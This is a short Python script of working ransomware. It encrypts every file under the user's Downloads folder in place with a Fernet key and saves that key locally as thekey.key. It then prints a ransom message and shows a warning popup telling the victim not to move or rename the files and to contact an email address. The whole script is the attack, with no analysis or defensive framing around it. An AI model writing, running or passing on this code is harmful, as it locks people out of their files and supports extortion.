import os
from cryptography.fernet import Fernet
from PyQt5.QtWidgets import QApplication, QMessageBox

def show_popup():
    app = QApplication([])

    msg = QMessageBox()
    msg.setIcon(QMessageBox.Warning)
    msg.setText(
        "All of your files have been encrypted! Do not move or rename any of your encrypted files, "
        "otherwise you will not be able to retrieve your files. Please contact me at someone@example.com."
    )
    msg.setWindowTitle("Warning! PAY ATTENTION!!!!")
    msg.setStandardButtons(QMessageBox.Ok)

    msg.exec_()

# Initialize list to store file paths
files = []

# Expand user path to the Downloads directory
target_path = os.path.expanduser('~/Downloads')

# Walk through directories and collect file paths
for dirpath, _, filenames in os.walk(target_path):
    for filename in filenames:
        file_path = os.path.join(dirpath, filename)
        files.append(file_path)

print("Files to encrypt:", files)

# Generate a key and save it to a file
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey_file:
    thekey_file.write(key)

# Encrypt all files
for file_path in files:
    try:
        # Open the file, read its contents, encrypt it, and then write it back
        with open(file_path, "rb") as file:
            contents = file.read()
            contents_encrypted = Fernet(key).encrypt(contents)

        with open(file_path, "wb") as file:
            file.write(contents_encrypted)
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")

print(
    "All of your files have been encrypted! Do not move or rename any of your encrypted files, "
    "otherwise you will not be able to retrieve your files. Please contact me at someone@example.com, [Phonenumber]"
)

show_popup()

